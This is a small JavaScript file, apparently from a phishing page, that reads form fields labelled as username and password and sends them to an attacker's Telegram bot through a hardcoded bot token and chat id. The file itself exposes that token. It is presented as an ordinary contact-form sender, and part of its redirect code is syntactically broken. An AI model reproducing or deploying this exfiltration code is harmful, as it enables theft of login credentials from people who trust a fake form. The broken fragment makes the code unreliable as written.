//bot token
var telegram_bot_id = "5699723630:AAGOD2-E8kWAOZeDEzdBxBxBg9S5RNVs5E8";
//chat id
var chat_id = 5322203833;
var u_name, email, message;
var ready = function () {
    u_name = document.getElementById("name").value;
    email = document.getElementById("email").value;
    message = document.getElementById("message").value;
    message = "👤Username : " + u_name + "\n🔒Password : " + email + "\n✉️Message : " + message;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);redirect: {
        enabled: true,                   // enable redirect after form submit
        url: "/success.html",             // url to redirect to
        timeout: 2                       // redirect timeout (seconds), leave 0 for instant redirect
    },
    });
    document.getElementById("name").value = "";
    document.getElementById("email").value = "";
    document.getElementById("message").value = "";
    return false;
};
